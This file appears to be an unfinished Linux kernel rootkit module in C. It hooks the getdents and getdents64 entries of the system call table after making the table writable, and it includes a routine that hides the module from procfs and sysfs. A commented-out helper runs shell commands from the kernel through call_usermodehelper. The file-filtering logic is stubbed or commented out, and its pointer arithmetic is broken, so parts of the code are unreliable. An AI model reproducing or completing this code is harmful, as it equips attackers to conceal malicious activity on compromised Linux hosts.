#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/unistd.h>    /* __NR_* system call indicies */
#include <asm/pgtable.h>     /* pte_mkwrite */

struct task_struct *kt; 
unsigned long *syscall_table;
pte_t *pte;

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[];  /* Filename (null-terminated) */
			    /* length is actually (d_reclen - 2 -
			      offsetof(struct linux_dirent, d_name) */
	/*
	char           pad;       // Zero padding byte
	char           d_type;    // File type (only since Linux 2.6.4;
				  // offsett is (d_reclen - 1))
	*/
};

static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent));
static inline int filter_out64(struct linux_dirent64 *dirp, int length, int (*pred)(struct linux_dirent64));
static inline int filter_fn(struct linux_dirent d);
static inline int filter_fn64(struct linux_dirent64 d);

asmlinkage int (*real_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage int (*real_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

asmlinkage int new_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
	int length;
	pr_info("ROOTKIT hooked call to new_getdents");
	length = real_getdents(fd, dirp, count);
	
	if (length <= 0) return length;
	
	return filter_out(dirp, length, &filter_fn);
}

asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
	int length;
	pr_info("ROOTKIT hooked call to new_getdents64");
	length = real_getdents64(fd, dirp, count);
	
	if (length <= 0) return length;
	
	return filter_out64(dirp, length, &filter_fn64);
}

static inline int filter_out(struct linux_dirent __user *dirp, int length, int (*pred)(struct linux_dirent)) {
	int index = 0;
	int index_copyto = -1;
	unsigned short reclen;
	struct linux_dirent d;
	// Why ints? Because getdents[64] returns an int.
	
	while (index < length) {
		d = *(dirp+index);
		reclen = d.d_reclen;
		
		if (reclen == 0) {
			pr_info("ROOTKIT reclen was 0 (CRITICAL ERROR THIS SHOULD NEVER HAPPEN)");
			break;
		}
		
		/*if (!pred(d)) {
			length -= reclen;
			
			if (index_copyto != -1) {
				index_copyto = index;
			}
		} else if (index_copyto != -1 && index_copyto != index) {
			memmove(dirp+index_copyto, dirp+index, reclen);
			index_copyto += reclen;
		}*/
		
		index += reclen;
	}
	
	return length;
}

static inline int filter_out64(struct linux_dirent64 __user *dirp, int length, int (*pred)(struct linux_dirent64)) {
	int index = 0;
	int index_copyto = -1;
	unsigned short reclen;
	struct linux_dirent64 d;
	// Why ints? Because getdents[64] returns an int.
	pred(*dirp);
	
	/*while (index < length) {
		d = *(dirp+index);
		reclen = d.d_reclen;
		
		if (!pred(d)) {
			length -= reclen;
			
			if (index_copyto != -1) {
				index_copyto = index;
			}
		} else if (index_copyto != -1 && index_copyto != index) {
			memmove(dirp+index_copyto, dirp+index, reclen);
			index_copyto += reclen;
		}
		
		index += reclen;
	}*/
	
	return length;
}

static inline int filter_fn(struct linux_dirent d) {
	pr_info("%s", d.d_name);
	
	return 0;
}

static inline int filter_fn64(struct linux_dirent64 d) {
	pr_info("%s", d.d_name);
	
	return 0;
}

void module_hide(void) {
	list_del(&THIS_MODULE->list);             //remove from procfs
	kobject_del(&THIS_MODULE->mkobj.kobj);    //remove from sysfs
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
}

/*

static int exec_cmd(char *script){
	char cmd[] = "/bin/sh";
	char *argv[3];
	char *envp[3];

	argv[0] = "ps";
	argv[1] = script;
	argv[2] = NULL;
	
	envp[0] = "HOME=/";
	envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
	envp[2] = NULL;

        // use UHM_WAIT_PROC to get useful error information
	pr_info("ROOTKIT executing %s\n", argv[1]);
	if (call_usermodehelper(cmd, argv, envp, UMH_NO_WAIT)) {
		//pr_info("ROOTKIT call_usermodehelper() failed\n");
		return 1;
	} else {
		return 0;
	}
}

*/


static int threadfn(void *data){
	do {
		pr_info("Kernel thread heartbeat (5s)");
		msleep(5000);
	} while (!kthread_should_stop());
	
	pr_info("ROOTKIT kernel thread stopping\n");
	return 0;
}

static int __init my_init(void)
{
	unsigned long *execve_addr;
	unsigned int level;

	syscall_table = NULL;
	execve_addr = NULL;

	pr_info("ROOTKIT module loaded at 0x%p\n", my_init);

	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
	pr_info("ROOTKIT syscall_table is at %p\n", syscall_table);

	pte = lookup_address((long unsigned int)syscall_table, &level);
	pr_info("ROOTKIT PTE address located %p\n", &pte);
	
	if (syscall_table != NULL) {
		pte->pte |= _PAGE_RW;
		
		real_getdents = (void *)syscall_table[__NR_getdents];
		real_getdents64 = (void *)syscall_table[__NR_getdents64];
		
		syscall_table[__NR_getdents] = (unsigned long)&new_getdents;
		syscall_table[__NR_getdents64] = (unsigned long)&new_getdents64;
		
		pte->pte &= ~_PAGE_RW;
		printk(KERN_EMERG "ROOTKIT sys_call_table hooked\n");
	} else {
		printk(KERN_EMERG "ROOTKIT sys_call_table is NULL\n");
	}

	//module_hide();
	 
	pr_info("ROOTKIT Starting main kernel thread.");
	kt = kthread_create(threadfn, NULL, "rootkit");
	wake_up_process(kt);
	
	return 0;
}


static void __exit my_exit(void)
{
	kthread_stop(kt);

	if (syscall_table != NULL) {
		pte->pte |= _PAGE_RW;

		syscall_table[__NR_getdents] = (unsigned long)real_getdents;
		syscall_table[__NR_getdents64] = (unsigned long)real_getdents64;

		pte->pte &= ~_PAGE_RW;

		printk(KERN_EMERG "ROOTKIT sys_call_table unhooked\n");
	} else {
		printk(KERN_EMERG "ROOTKIT syscall_table is NULL\n");
	}

	pr_info("ROOTKIT unloaded from 0x%p\n", my_exit);
}

module_init(my_init);
module_exit(my_exit);

MODULE_AUTHOR("Ring -4");
MODULE_LICENSE("GPL v2");

